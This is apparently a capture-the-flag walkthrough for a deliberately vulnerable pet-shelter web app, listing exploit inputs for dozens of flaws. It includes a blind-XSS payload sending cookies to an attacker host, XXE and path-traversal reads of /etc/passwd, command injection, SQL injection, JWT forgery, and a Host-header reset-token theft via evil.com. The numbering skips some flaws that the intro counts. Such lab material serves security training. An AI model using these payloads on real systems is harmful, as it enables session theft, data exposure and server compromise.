# PawsHaven Web CTF: Complete Solutions Walkthrough

This manual guides you through exploiting all 36 logic flaws and vulnerabilities directly through the **PawsHaven Web Application Interface**. 

Since this is an interactive web platform, these solutions will focus on exactly **where to navigate on the website** and **what inputs to type** to trigger the attacks natively, rather than just hitting backend API endpoints directly.

---

### VULN #1: Method Tampering
- **Where to Hack:** Any user's profile view (e.g., `/animals` adoption reviews)
- **How to Exploit:** The platform's frontend doesn't show a "Delete User" button. However, if you intercept any profile request with Burp Suite and change the HTTP Method from `GET` to `DELETE` against `/api/users/dXNlcl8y`, the server will wipe the account because it has no authorization checks!

### VULN #2: Self XSS
- **Where to Hack:** The Community Board (`/community`)
- **How to Exploit:** Type `<script>alert('Self XSS')</script>` directly into the community comment box and hit submit. The page will immediately render the raw HTML and pop an alert for you.

### VULN #3: Incomplete XSS Filter & Stored XSS
- **Where to Hack:** Report Stray Animal Page (`/reports/stray`)
- **How to Exploit:** The developer tried (and failed) to filter XSS here by blocking literal `<script>` tags. Bypass it by entering `<img src=x onerror=alert("Stored XSS")>` into the Description field. Anyone viewing the stray reports will execute it.

### VULN #4: Blind XSS
- **Where to Hack:** The Contact Us Form (`/contact`) or Community Posts
- **How to Exploit:** Submit a support ticket or post containing `<script>fetch('http://your-hacker-site.com/?c='+document.cookie)</script>`. You won't see anything happen, but when the Admin logs into their `/admin/review` panel to read your ticket, the script fires blindly and steals their session cookie!

### VULN #5: OS Command Injection (Remote Code Execution)
- **Where to Hack:** Vet Diagnostic Tool (`/vet/diagnose`)
- **How to Exploit:** The diagnostic UI expects an IP address to ping. Terminate the string and chain a Linux shell command by typing: `127.0.0.1; whoami` into the input bar. The server executes it natively.

### VULN #6: IDOR (Insecure Direct Object Reference)
- **Where to Hack:** Your Profile URL / Dashboard (`/dashboard/profile`)
- **How to Exploit:** Notice your User ID usually looks like `dXNlcl8x` in the UI. This is just Base64 for `user_1`! Decode it, change it to `user_2` (the Admin), re-encode it to Base64 (`dXNlcl8y`), and paste it into the URL or via API tools to view the Admin profile.

### VULN #7: Forced Browsing (Predictable Filenames)
- **Where to Hack:** Donation Receipts & Adoptions
- **How to Exploit:** When you make a donation, the site gives you a receipt link. If you look at the URL, it's something like `/receipts/receipt_001.pdf`. The web server doesn't password-protect this folder. You can blindly navigate to `receipt_002.pdf`, `receipt_003.pdf`, etc., to steal others' financial documents.

### VULN #8: Weak Password Policy
- **Where to Hack:** The Registration Page (`/register`)
- **How to Exploit:** The UI warns about secure passwords, but the backend doesn't enforce it. You can literally register an account with the password `1`. This allows you to easily brute force existing accounts (like Admin/Vet accounts) if they also used a 1-character password.

### VULN #9: Information Disclosure
- **Where to Hack:** Your Profile View (Inspect Element / Burp)
- **How to Exploit:** When the dashboard loads your profile data, look at the underlying network request response data. The server is wildly generous and leaks the entire database row, giving you your own hashed password and internal server IPs. 

### VULN #10: XXE (XML External Entity Injection)
- **Where to Hack:** Import Animal Data Page (`/animals/import`)
- **How to Exploit:** The UI allows uploading XML records. Craft a malicious XML file that utilizes external entities to read server files. 
```xml
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<animal><name>&xxe;</name></animal>
```
When submitted in the UI, the imported animal's name will literally be the contents of the server's password file!

### VULN #11: SSRF (Server-Side Request Forgery)
- **Where to Hack:** Integrations Settings (`/integrations`)
- **How to Exploit:** The Webhook Tester allows you to ping servers, but it claims to block "localhost" to prevent internal network scanning. Bypass the filter by typing `http://127.0.0.1:8080/config` to access internal, firewalled configurations!

### VULN #12 & #24: Local File Inclusion & Path Traversal
- **Where to Hack:** Any File Download Button (e.g. Export Data)
- **How to Exploit:** When you click download, observe the URL parameter `?path=uploads/...`. Replace the file path directly in your browser's address bar with `../../../../../../etc/passwd` to traverse out of the web directory and download server operating system files.

### VULN #13: Remote File Inclusion (RFI)
- **Where to Hack:** External Links
- **How to Exploit:** Similar to LFI, the `/api/misc/render` engine will blindly fetch and render anything if you append it to the URL query string.

### VULN #14: Business Logic Flaw (Coupon Math)
- **Where to Hack:** The Pharmacy Store (`/store`)
- **How to Exploit:** Add items to your cart, and use the "Verify Coupon" preview tool. It calculates discounts improperly without actually exhausting/consuming the coupon in certain flows!

### VULN #15: SSTI (Server-Side Template Injection)
- **Where to Hack:** Newsletter Subscription Box (`/newsletter`)
- **How to Exploit:** Enter `{{ 7 * 7 }}` natively into the "Name" field on the website. If the page loads and says "Welcome 49", the server is blindly compiling your name as Python code. You can use this to execute global Python commands and hack the server.

### VULN #16: Mass Assignment
- **Where to Hack:** Edit Profile Page (`/dashboard/profile`)
- **How to Exploit:** When saving your profile, the web app sends a PUT request with your name and email. Intercept the save request and manually inject `"role": "admin"`. When you refresh the website, you will be a full administrator!

### VULN #17: HTML Injection
- **Where to Hack:** Animal Share Links
- **How to Exploit:** When sharing an animal, the UI adds a `?note=` parameter to the URL to parse a custom message. Change the URL bar to `?note=<h1>HACKED</h1>` and send it to a victim. It completely restructures the visual DOM layout.

### VULN #18: No Rate Limiting
- **Where to Hack:** Login Page (`/login`)
- **How to Exploit:** You can load up an automated brute force tool like Burp Intruder against the login form. The server never locks your account or slows you down, allowing indefinite guessing of admin passwords.

### VULN #19: CSRF (Cross-Site Request Forgery)
- **Where to Hack:** Admin Panel / Adoptions (`/admin`)
- **How to Exploit:** The buttons to "Approve Adoption" do not generate unique Anti-CSRF tokens. You can construct a fake webpage with a hidden auto-submitting form targeting the approval path, trick an Admin into clicking your link, and forcefully authorize adoptions on their behalf.

### VULN #21: JWT "alg: none" Signature Bypass
- **Where to Hack:** Browser Developer Tools (Cookies)
- **How to Exploit:** Hit `F12`, locate your `token` cookie. Decode it via JWT.io, change `"alg": "HS256"` to `"alg": "none"`. Change your underlying `user_id` inside the payload to the administrator's ID. Erase the signature entirely (but keep the period) and paste it back into your browser. Refresh the page to takeover their account!

### VULN #22: SQL Injection
- **Where to Hack:** Animal Search Bar (`/animals`)
- **How to Exploit:** Simply type `' OR 1=1 --` into the animal search bar natively on the website. The SQL string logic breaks, dumping the entire unabridged database into the search results.

### VULN #23: Open Redirect
- **Where to Hack:** The Address Bar
- **How to Exploit:** Append `/api/redirect?url=http://hacker.com` after the main application domain. If you send this link to an employee, they will trust the PawsHaven domain but get automatically bounced to your phishing site.

### VULN #25: Insecure Deserialization
- **Where to Hack:** Data Import Tool
- **How to Exploit:** Utilizing the "Legacy Export Format", the server imports native Python Object binaries! If you craft a malicious pickle object containing standard Python `os.system()` shells, executing the import runs the shell instantly.

### VULN #26 & #29: Host Header Injection / Predictable Tokens
- **Where to Hack:** Forgot Password Page (`/forgot-password`)
- **How to Exploit:**
    1. Intercept the Forgot Password form submission.
    2. Change your `Host:` Header to `evil.com`.
    3. The email sent to the user will contain a password reset link pointing to YOUR server, allowing you to steal their token when they click it. Furthermore, you don't even need to steal it—the token is just Base64 of their ID + the exact current clock time!

### VULN #27: CORS Misconfiguration
- **Where to Hack:** Cross-origin script interactions
- **How to Exploit:** The server uses `Access-Control-Allow-Origin: *` while simultaneously allowing credentials, which means any Website B on the internet can read authentic API data from Website A (PawsHaven) on behalf of the victim's browser session.

### VULN #28: Unrestricted File Upload
- **Where to Hack:** Profile Avatar Uploader (`/dashboard/profile`)
- **How to Exploit:** Try uploading a `.html` or `.py` file instead of a `.jpg` or `.png`. The server doesn't check extensions. You can upload an HTML document to use as a spear-phishing payload hosted on the primary domain.

### VULN #30: Race Condition
- **Where to Hack:** Checkout Button (`/store`)
- **How to Exploit:** Capture the moment you click "Checkout" while a single-use coupon is active. Send the request to Burp Suite Intruder and blast 30 identical requests at the exact same millisecond. Because the database checks aren't thread-locked, it will successfully apply the 1-time coupon multiple times simultaneously!

### VULN #32: HTTP Header Injection (CRLF)
- **Where to Hack:** URL tracking parameters
- **How to Exploit:** Some page redirect URLs append `&ref=xxx`. Using carriage returns (`%0d%0a`), you can break out of the header block and push a fake `Set-Cookie` line into the server's response.

### VULN #34: Verbose Error Messages
- **Where to Hack:** Causing any server crash (e.g. typing `'` into the search bar).
- **How to Exploit:** The Flask UI crashes gracefully but spills out massive amounts of forensic data, including exact physical pathways to the server files (i.e. `/home/viruz/...`) that you can feed into the Local File Inclusion parameters.

### VULN #35: Broken Object-Level Auth (BOLA)
- **Where to Hack:** Appointments List (`/dashboard/appointments`)
- **How to Exploit:** You are only meant to see appointments tied to your user session. By observing how the UI queries the internal API or by manipulating UI URL filters, the API serves you everyone else's private vet appointments effortlessly.

### VULN #36: Simulated NoSQL Injection
- **Where to Hack:** Any Advanced List Filters
- **How to Exploit:** In URL parameters mimicking NoSQL searches (like filtering animals), you can insert JSON logic variables manually in the address bar (e.g., `?filter={"species":{"$ne":"Alien"}}`). This circumvents equality checks and leaks records you shouldn't see.
